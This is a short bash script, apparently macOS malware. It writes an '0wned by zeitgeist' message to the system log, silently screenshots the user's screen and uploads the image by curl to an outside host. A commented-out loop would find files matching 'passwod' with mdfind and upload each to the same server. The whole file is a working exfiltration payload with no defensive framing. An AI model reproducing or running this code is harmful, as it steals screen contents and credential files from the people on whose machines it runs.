#!/bin/bash
/bin/echo "0wned by zeitgeist" | /usr/bin/logger

# For screen capturing and uploading
screencapture -Sx /tmp/screen.jpg
curl -F userfile=@/tmp/screen.jpg -F press=ok http://www.geisterstunde.org/upload.php

# For searching for strings and uploading the files
#for filename in `mdfind passwod`
#do
#	if [[ -e $filename ]]
#	then
#   	/usr/bin/curl -F userfile=@$filename -F press=ok http://www.geisterstunde.org/upload.php
#	fi
#done
